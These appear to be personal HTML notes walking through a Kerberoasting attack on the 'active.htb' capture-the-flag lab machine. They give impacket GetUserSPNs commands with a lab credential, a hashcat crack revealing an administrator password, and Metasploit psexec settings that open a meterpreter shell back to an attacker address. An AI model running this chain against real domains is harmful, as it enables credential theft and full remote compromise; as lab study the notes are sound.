<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Kerberoasting</title>
</head><body><b>(3) Kerberoasting :<br/>
<br/>
<img src="selection_041.png" /><br/>
<br/>
</b>&nbsp; - kerberos : authentification service protocol<br/>
&nbsp;&#09;- using tickets as a form of communication/authentication<ul><li style="list-style-type: none"></li>
</ul>
<img src="https://www.researchgate.net/profile/Alvaro_Cardenas/publication/265007903/figure/fig1/AS:647538654855168@1531396654190/A-simplified-version-of-the-Kerberos-authentication-system-both-the-client-and-a-service.png" /><br/>
<img src="a-simplified-version-of-the-kerberos-aut.png" width="600" height="254" /><br/>
<br/>
&nbsp;&#09;=&gt; <b><u>kerberoasting</u></b>&nbsp;: with any valid <b>TGT</b>, we can request a <b>TGS</b>&nbsp;for this particular <b>SPN<br/>
</b><b><br/>
</b>See (part 4) : https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa<br/>
<br/>
<u>(1) GetUserSPNs : impacket tool<br/>
<br/>
</u>&nbsp;&#09;=&gt; Get target SPNs with GPP credentials (domain/username + cpassword)<u><br/>
</u><u><br/>
</u>&nbsp;&#09;- locate GetUserSPNs<br/>
&nbsp;&#09;- cd /usr/share/doc/python3-impacket/examples/<br/>
&nbsp;&#09;<img src="image.png" width="400" height="106" /><br/>
<ul><li style="list-style-type: none">- python GetUserSPNs.py [target-domain/username:cppasword] &nbsp;-dc-ip [domain-controller-ip] -request</li>
<li style="list-style-type: none">&nbsp;&#09;- python GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none"><img src="image 2.png" width="800" height="356" /></li>
</ul>
</li>
</ul>
<ul><li style="list-style-type: none">- echo '&lt;hash&gt;' &gt; spn_hash.txt</li>
<li style="list-style-type: none">- cat spn_hash.txt</li>
<li style="list-style-type: none"></li>
</ul>
<u>(2) Decrypt hash with hashcat</u><br/>
&nbsp;&#09;- module 13100<br/>
<img src="selection_052.png" width="600" height="119" /><ul><li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">- &nbsp;hashcat -m 13100 spn_hash.txt wordlist/rockyou.txt</li>
<li style="list-style-type: none"><img src="image 3.png" /></li>
<li style="list-style-type: none"><img src="image 4.png" /></li>
<li style="list-style-type: none">&nbsp;&#09;=&gt; Ticketmaster1968</li>
<li style="list-style-type: none"></li>
</ul>
<br/>
<u>(3) Connect to share and gain a shell with PsExec<br/>
</u>&nbsp;&#09;- msfconsole<br/>
&nbsp;&#09;&#09;&gt; use exploit/windows/smb/psexec<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&gt; options</li>
<li style="list-style-type: none">&gt; set smbdomain active.htb</li>
<li style="list-style-type: none">&gt; set smbuser administrator</li>
<li style="list-style-type: none">&gt; set smbpass Ticketmaster1968</li>
<li style="list-style-type: none">&gt; set rhosts 10.10.10.100</li>
<li style="list-style-type: none">&gt; set lhost 10.10.14.7</li>
<li style="list-style-type: none">&gt; run</li>
<li style="list-style-type: none"><img src="image 5.png" /></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"><img src="image 6.png" /></li>
<li style="list-style-type: none">&nbsp;&#09;=&gt; meterpreter session opened</li>
<li style="list-style-type: none"></li>
</ul>
</li>
</ul>
<br/>
&nbsp;&#09;&#09;<br/>
</body></html>